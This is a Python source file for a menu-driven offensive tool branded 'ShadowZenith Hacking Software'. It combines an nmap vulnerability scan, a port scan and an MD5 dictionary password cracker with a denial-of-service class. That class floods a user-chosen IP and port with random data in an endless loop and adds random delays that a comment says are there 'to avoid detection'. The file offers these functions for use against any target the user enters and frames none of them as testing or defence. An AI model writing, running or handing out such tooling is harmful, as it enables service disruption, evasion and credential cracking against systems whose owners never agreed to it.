import nmap
import random
import time
import socket
import threading
import hashlib
import sys 

# Color codes
COLOR_CYAN = "\033[96m"
COLOR_YELLOW = "\033[93m"
COLOR_GREEN = "\033[92m"
COLOR_RED = "\033[91m"
COLOR_END = "\033[0m"

BANNERS = [
    '''
    ██████╗ ██╗    ██╗ ██████╗ ███████╗███████╗████████╗
    ██╔══██╗██║    ██║██╔════╝ ██╔════╝██╔════╝╚══██╔══╝
    ██████╔╝██║ █╗ ██║██║  ███╗█████╗  ███████╗   ██║   
    ██╔═══╝ ██║███╗██║██║   ██║██╔══╝  ╚════██║   ██║   
    ██║     ╚███╔███╔╝╚██████╔╝███████╗███████║   ██║   
    ╚═╝      ╚══╝╚══╝  ╚═════╝ ╚══════╝╚══════╝   ╚═╝   
    ''',
    '''
    ███╗   ██╗ █████╗ ██████╗ ██╗ ██████╗███████╗██████╗ 
    ████╗  ██║██╔══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗
    ██╔██╗ ██║███████║██║  ██║██║██║     █████╗  ██████╔╝
    ██║╚██╗██║██╔══██║██║  ██║██║██║     ██╔══╝  ██╔══██╗
    ██║ ╚████║██║  ██║██████╔╝██║╚██████╗███████╗██║  ██║
    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
    ''',
    '''
    ███████╗██╗  ██╗ ██████╗ ███╗   ██╗███████╗██████╗ 
    ██╔════╝██║  ██║██╔═══██╗████╗  ██║██╔════╝██╔══██╗
    ███████╗███████║██║   ██║██╔██╗ ██║█████╗  ██████╔╝
    ╚════██║██╔══██║██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗
    ███████║██║  ██║╚██████╔╝██║ ╚████║███████╗██║  ██║
    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    '''
]

class DoS_Attack:
    count = 0 

    def __init__(self):
        try:
            self.target = str(input(COLOR_YELLOW + 'Enter target IP address: ' + COLOR_END))
            self.port = int(input(COLOR_YELLOW + 'Enter target port: ' + COLOR_END))
        except Exception as e:
            print(COLOR_RED + f'ERROR: {e}' + COLOR_END)

    def attack(self):
        try:
            print(COLOR_GREEN + '\n+[+[+[ Initiating DoS Attack ]+]+]+' + COLOR_END)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)

            try:
                sock.connect((self.target, self.port))
            except Exception as e:
                print(COLOR_RED + f"Connection error: {e}" + COLOR_END)
                sys.exit()

            while True:
                try:
                    # Generate random data to send
                    data = random._urandom(1024)
                    sock.sendto(data, (self.target, self.port))
                    self.count += 1
                    print(COLOR_YELLOW + f'DoS Attack Count: {self.count}' + COLOR_END)

                    # Sleep for a random interval to avoid detection
                    time.sleep(random.uniform(0.1, 0.5))
                except Exception as e:
                    print(COLOR_RED + f"Error sending data: {e}" + COLOR_END)
                    sys.exit()
        except KeyboardInterrupt:
            print(COLOR_RED + '\n+[+[+[ Attack stopped ]+]+]+' + COLOR_END)
            sys.exit()

def show_banner():
    banner = random.choice(BANNERS)
    print(COLOR_YELLOW + banner + COLOR_END)

def show_menu():
    print(COLOR_CYAN + "=== ShadowZenith Hacking Software ===" + COLOR_END)
    print("[1] Perform Vulnerability Scan")
    print("[2] Denial Of Service Attack")
    print("[3] Crack Password")
    print("[4] Scan for Open Ports")
    print("[0] Exit")

def vulnerability_scan():
    target_ip = input(COLOR_YELLOW + "Enter the target IP address: " + COLOR_END)
    delay = random.uniform(0.5, 2.0)
    time.sleep(delay)

    nm = nmap.PortScanner()
    nm.scan(target_ip, arguments='-Pn -sV --script vuln')

    for host in nm.all_hosts():
        print(COLOR_GREEN + f"Scanning vulnerabilities for host: {host}" + COLOR_END)
        for port in nm[host].all_tcp():
            if 'script' in nm[host]['tcp'][port]:
                script_output = nm[host]['tcp'][port]['script']
                print(f"Port {port} - {script_output}")

def scan_ports():
    target_ip = input(COLOR_YELLOW + "Enter the target IP address: " + COLOR_END)
    start_port = int(input(COLOR_YELLOW + "Enter the starting port: " + COLOR_END))
    end_port = int(input(COLOR_YELLOW + "Enter the ending port: " + COLOR_END))

    nm = nmap.PortScanner()
    scan_range = f"{start_port}-{end_port}"
    nm.scan(target_ip, scan_range)

    for host in nm.all_hosts():
        print(COLOR_GREEN + f"Scanning ports for host: {host}" + COLOR_END)
        for port in nm[host].all_tcp():
            state = nm[host]['tcp'][port]['state']
            print(f"Port {port} - {state}")

def crack_password():
    target_hash = input(COLOR_YELLOW + "Enter the target's password hash: " + COLOR_END)
    password_list = []
    print(COLOR_CYAN + "Enter passwords (leave blank to finish):" + COLOR_END)
    while True:
        password = input()
        if not password:
            break
        password_list.append(password)

    cracked_password = crack_password_hash(target_hash, password_list)
    if cracked_password:
        print(COLOR_GREEN + "The password is:", cracked_password + COLOR_END)
    else:
        print(COLOR_RED + "Password not found." + COLOR_END)

def crack_password_hash(hash_value, password_list):
    for password in password_list:
        password_hash = hashlib.md5(password.encode()).hexdigest()
        if password_hash == hash_value:
            return password
    return None

def main():
    show_banner()
    while True:
        show_menu()
        choice = input(COLOR_YELLOW + "Enter your choice: " + COLOR_END)

        if choice == "1":
            vulnerability_scan()
        elif choice == "2":
            DoS_Attack().attack()
        elif choice == "3":
            crack_password()
        elif choice == "4":
            scan_ports()
        elif choice == "0":
            print(COLOR_CYAN + "Exiting..." + COLOR_END)
            break
        else:
            print(COLOR_RED + "Invalid choice. Please try again." + COLOR_END)

if __name__ == "__main__":
    main()
